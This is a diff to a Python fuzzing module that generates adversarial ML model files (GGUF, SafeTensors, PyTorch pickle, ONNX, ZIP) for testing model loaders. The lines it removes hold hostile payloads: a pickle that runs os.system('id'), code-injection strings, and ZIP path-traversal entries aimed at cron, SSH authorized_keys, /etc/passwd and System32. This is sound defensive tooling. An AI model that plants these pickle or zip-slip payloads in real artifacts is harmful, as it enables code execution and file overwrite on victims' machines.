@@ -1,188 +1,171 @@
-"""Artifact format generator — GGUF, ONNX, SafeTensors, PyTorch, ZIP."""
+"""Artifact format generator for ML and agent supply-chain files.
+
+Public entry-point.  Byte generation lives in the ``generators`` subpackage,
+split by format family:
+
+- ``binary_formats``    — GGUF, SafeTensors, NPY/NPZ, ONNX, TFLite
+- ``pickle_formats``    — PyTorch, joblib, cloudpickle, dill, marshal
+- ``archive_formats``   — Keras, CoreML, Skops, NeMo, ZIP-slip
+- ``inference_formats`` — OpenVINO, PMML, XGBoost, LightGBM, CatBoost
+- ``ml_frameworks``     — MLflow, TorchScript, Flax/JAX, LoRA, Tokenizer, Paddle
+- ``agentic_formats``  — Ollama Modelfile, LlamaFile
+"""
 
 from __future__ import annotations
 
-import io
-import json
 import random
-import struct
-import zipfile
-from typing import Optional
 
 from ..base import Generator
+from .generators import agentic_formats as _agent
+from .generators import archive_formats as _arc
+from .generators import binary_formats as _bin
+from .generators import inference_formats as _inf
+from .generators import ml_frameworks as _ml
+from .generators import pickle_formats as _pkl
 
 
 class ArtifactGenerator(Generator):
     """Generates adversarial ML artifact files.
 
-    Supports: GGUF header fuzzing, SafeTensors header corruption,
-    PyTorch ZIP+pickle, ONNX protobuf, ZIP path traversal.
+    Supports binary model formats, archive/container formats, text model
+    manifests, and legacy serialization containers.
     """
 
-    def __init__(self, format: str = "random", seed: Optional[int] = None):
+    _BASE_FORMATS = (
+        "gguf",
+        "safetensors",
+        "pytorch",
+        "zip",
+        "onnx",
+        "keras",
+        "keras_h5",
+        "tflite",
+        "coreml",
+        "mlmodel",
+        "skops",
+        "nemo",
+        "openvino_xml",
+        "pmml",
+        "npy",
+        "npz",
+        "joblib",
+        "cloudpickle",
+        "dill",
+        "marshal",
+        "onnx_external",
+        "xgboost",
+        "lightgbm",
+        "catboost",
+        "mlflow",
+        "torchscript",
+        "flax_checkpoint",
+        "lora_adapter",
+        "tokenizer_json",
+        "ollama_modelfile",
+        "paddle",
+        "llamafile",
+    )
+
+    _FORMAT_ALIASES = {
+        "h5": "keras_h5",
+        "hdf5": "keras_h5",
+        "keras_zip": "keras",
+        "keras_v3": "keras",
+        "litert": "tflite",
+        "mlpackage": "coreml",
+        "coreml_package": "coreml",
+        "openvino": "openvino_xml",
+        "openvino_ir": "openvino_xml",
+        "numpy": "npy",
+        "npy_pickle": "npy",
+        "npz_pickle": "npz",
+        "pkl": "pytorch",
+        "pickle": "pytorch",
+        "external_data": "onnx_external",
+        "onnx_external_data": "onnx_external",
+        "xgb": "xgboost",
+        "lgb": "lightgbm",
+        "cbm": "catboost",
+        "mlflow_model": "mlflow",
+        "torchscript_pt": "torchscript",
+        "pt": "torchscript",
+        "flax": "flax_checkpoint",
+        "jax": "flax_checkpoint",
+        "lora": "lora_adapter",
+        "tokenizer": "tokenizer_json",
+        "hf_tokenizer": "tokenizer_json",
+        "ollama": "ollama_modelfile",
+        "modelfile": "ollama_modelfile",
+        "paddlepaddle": "paddle",
+        "pdparams": "paddle",
+        "llama": "llamafile",
+        "llamafile_bin": "llamafile",
+    }
+
+    # Dispatch table: format → module-level function
+    _GENERATORS = {
+        # binary
+        "gguf":            _bin.gen_gguf,
+        "safetensors":     _bin.gen_safetensors,
+        "onnx":            _bin.gen_onnx_stub,
+        "tflite":          _bin.gen_tflite_stub,
+        "npy":             _bin.gen_numpy_npy,
+        "npz":             _bin.gen_numpy_npz,
+        "onnx_external":   _bin.gen_onnx_external_data,
+        # pickle-based
+        "pytorch":         _pkl.gen_pytorch_zip,
+        "zip":             _pkl.gen_zip_slip,
+        "joblib":          _pkl.gen_joblib_stream,
+        "cloudpickle":     _pkl.gen_cloudpickle_stream,
+        "dill":            _pkl.gen_dill_stream,
+        "marshal":         _pkl.gen_marshal_blob,
+        # archive/container
+        "keras":           _arc.gen_keras_zip,
+        "keras_h5":        _arc.gen_keras_h5_stub,
+        "coreml":          _arc.gen_coreml_package,
+        "mlmodel":         _arc.gen_coreml_model,
+        "skops":           _arc.gen_skops_zip,
+        "nemo":            _arc.gen_nemo_archive,
+        # inference
+        "openvino_xml":    _inf.gen_openvino_xml,
+        "pmml":            _inf.gen_pmml_xml,
+        "xgboost":         _inf.gen_xgboost_binary,
+        "lightgbm":        _inf.gen_lightgbm_text,
+        "catboost":        _inf.gen_catboost_binary,
+        # ml frameworks
+        "mlflow":          _ml.gen_mlflow_model,
+        "torchscript":     _ml.gen_torchscript,
+        "flax_checkpoint": _ml.gen_flax_checkpoint,
+        "lora_adapter":    _ml.gen_lora_adapter,
+        "tokenizer_json":  _ml.gen_tokenizer_json,
+        "paddle":          _ml.gen_paddle_model,
+        # agentic
+        "ollama_modelfile": _agent.gen_ollama_modelfile,
+        "llamafile":        _agent.gen_llamafile,
+    }
+
+    def __init__(self, format: str = "random", seed: int | None = None):  # noqa: A002
         self._format = format
         self._seed = seed
 
-    def generate(self, seed: Optional[int] = None) -> bytes:
-        rng = random.Random(seed or self._seed)
-        fmt = self._format
-        if fmt == "random":
-            fmt = rng.choice(["gguf", "safetensors", "pytorch", "zip", "onnx"])
+    @classmethod
+    def supported_formats(cls) -> tuple[str, ...]:
+        """Return canonical artifact format names accepted by the generator."""
+        return cls._BASE_FORMATS
 
-        if fmt == "gguf":
-            return self._gen_gguf(rng)
-        elif fmt == "safetensors":
-            return self._gen_safetensors(rng)
-        elif fmt == "pytorch":
-            return self._gen_pytorch_zip(rng)
-        elif fmt == "zip":
-            return self._gen_zip_slip(rng)
-        elif fmt == "onnx":
-            return self._gen_onnx_stub(rng)
-        else:
-            return self._gen_gguf(rng)
+    def generate(self, seed: int | None = None) -> bytes:
+        rng = random.Random(self._seed if seed is None else seed)  # noqa: S311
+        fmt = self._normalize_format(self._format)
+        if fmt == "random":
+            fmt = rng.choice(self._BASE_FORMATS)
+        gen_fn = self._GENERATORS.get(fmt, _bin.gen_gguf)
+        return gen_fn(rng)
 
     def generate_from_bytes(self, data: bytes) -> bytes:
         seed = int.from_bytes(data[:8].ljust(8, b"\x00"), "little")
         return self.generate(seed=seed)
 
-    def _gen_gguf(self, rng: random.Random) -> bytes:
-        """Generate malformed GGUF file header."""
-        buf = io.BytesIO()
-
-        # GGUF magic bytes
-        buf.write(b"GGUF")
-        # Version (corrupt)
-        version = rng.choice([1, 2, 3, 0, 255, 0xFFFFFFFF])
-        buf.write(struct.pack("<I", version & 0xFFFFFFFF))
-        # Tensor count (potentially huge)
-        tensor_count = rng.choice([0, 1, 0xFFFFFFFF, 0x7FFFFFFF])
-        buf.write(struct.pack("<Q", tensor_count))
-        # KV count (potentially huge)
-        kv_count = rng.choice([0, 1, 100, 0xFFFFFFFF])
-        buf.write(struct.pack("<Q", kv_count))
-
-        # Fake KV pairs with malicious content
-        for _ in range(min(5, kv_count)):
-            key = rng.choice([
-                b"general.name",
-                b"general.architecture",
-                b"general.author",
-                b"tokenizer.ggml.model",
-                b"__import__('os').system('id')",
-                b"../../../etc/passwd",
-            ])
-            buf.write(struct.pack("<Q", len(key)))
-            buf.write(key)
-            # Type: string (8)
-            buf.write(struct.pack("<I", 8))
-            val = rng.choice([
-                b"llama",
-                b"A" * 10000,
-                b"\x00" * 100,
-                b"{{__import__('os').system('id')}}",
-            ])
-            buf.write(struct.pack("<Q", len(val)))
-            buf.write(val)
-
-        # Pad with garbage
-        buf.write(bytes(rng.randint(0, 255) for _ in range(rng.randint(100, 500))))
-        return buf.getvalue()
-
-    def _gen_safetensors(self, rng: random.Random) -> bytes:
-        """Generate malformed SafeTensors header."""
-        choice = rng.random()
-
-        if choice < 0.3:
-            # Oversized header length
-            header_len = 0xFFFFFFFF
-            header = b'{"test": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}'
-            return struct.pack("<Q", header_len) + header
-        elif choice < 0.5:
-            # Malicious JSON in header
-            header = json.dumps({
-                "__import__('os').system('id')": {
-                    "dtype": "F32",
-                    "shape": [1],
-                    "data_offsets": [0, 4],
-                },
-                "__metadata__": {
-                    "eval": "__import__('os').system('id')",
-                    "path": "../../../etc/passwd",
-                },
-            }).encode()
-            return struct.pack("<Q", len(header)) + header + b"\x00" * 4
-        elif choice < 0.7:
-            # Zero-length header
-            return struct.pack("<Q", 0)
-        else:
-            # Negative offsets / huge shapes
-            header = json.dumps({
-                "weight": {
-                    "dtype": "F32",
-                    "shape": [0x7FFFFFFF, 0x7FFFFFFF],
-                    "data_offsets": [-1, 0xFFFFFFFFFFFFFFFF],
-                },
-            }).encode()
-            return struct.pack("<Q", len(header)) + header
-
-    def _gen_pytorch_zip(self, rng: random.Random) -> bytes:
-        """Generate malicious PyTorch ZIP with embedded pickle."""
-        buf = io.BytesIO()
-        with zipfile.ZipFile(buf, "w") as zf:
-            # Standard PyTorch structure
-            zf.writestr("archive/data.pkl", b"\x80\x02cos\nsystem\n(S'id'\ntR.")
-            zf.writestr("archive/data/0", b"\x00" * 16)
-
-            # Optional: path traversal
-            if rng.random() < 0.5:
-                zf.writestr("../../../tmp/pwned.txt", b"PWNED")
-
-        return buf.getvalue()
-
-    def _gen_zip_slip(self, rng: random.Random) -> bytes:
-        """Generate ZIP with path traversal entries."""
-        buf = io.BytesIO()
-        with zipfile.ZipFile(buf, "w") as zf:
-            traversal_paths = [
-                "../../../etc/cron.d/backdoor",
-                "../../../tmp/pwned",
-                "..\\..\\..\\Windows\\System32\\evil.dll",
-                "archive/../../../home/user/.ssh/authorized_keys",
-                "data/../../../../../../etc/passwd",
-            ]
-            for path in traversal_paths:
-                zf.writestr(path, b"MALICIOUS CONTENT")
-
-            # Also add symlink-like entry
-            zf.writestr("symlink.txt", b"/etc/shadow")
-
-        return buf.getvalue()
-
-    def _gen_onnx_stub(self, rng: random.Random) -> bytes:
-        """Generate malformed ONNX protobuf stub."""
-        buf = io.BytesIO()
-
-        # Protobuf field: ir_version (field 1, varint)
-        buf.write(b"\x08")
-        buf.write(struct.pack("B", rng.choice([0, 1, 7, 8, 9, 255])))
-
-        # producer_name (field 2, length-delimited)
-        producer = rng.choice([
-            b"onnx",
-            b"__import__('os').system('id')",
-            b"A" * 10000,
-            b"\x00" * 500,
-        ])
-        buf.write(b"\x12")
-        buf.write(struct.pack("B", min(127, len(producer))))
-        buf.write(producer[:127])
-
-        # model_version (field 5, varint) — huge value
-        buf.write(b"\x28")
-        buf.write(b"\xFF\xFF\xFF\xFF\x07")
-
-        # Add garbage graph
-        buf.write(bytes(rng.randint(0, 255) for _ in range(rng.randint(50, 200))))
-
-        return buf.getvalue()
+    @classmethod
+    def _normalize_format(cls, fmt: str) -> str:
+        normalized = fmt.strip().lower().replace("-", "_")
+        return cls._FORMAT_ALIASES.get(normalized, normalized)
